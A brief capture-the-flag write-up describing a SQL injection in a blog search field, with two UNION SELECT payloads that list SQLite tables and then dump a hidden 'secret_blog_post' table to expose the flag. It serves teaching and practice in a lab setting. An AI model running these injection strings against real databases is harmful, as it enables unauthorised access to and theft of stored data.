# Challenge `Wow, it can't be more juicy than this!` writeup

- Vulnerability: SQL injection

- Where: search field [SQL: SELECT id, title, content FROM blog_post WHERE title LIKE '%'%' OR content LIKE '%'UNION SELECT%']

- Impact: attacker is able to inject a sql query and get the secret blog post(article)

---

## Steps to reproduce

1. Insert "'UNION SELECT name, tbl_name, sql FROM sqlite_master WHERE type='table' -- " on search field
 - 1.1. secret_blog_post is now visible.
2. Insert "'UNION SELECT id, title, content FROM secret_blog_post -- "
 - 2.1. Reminder with the flag is now visible.
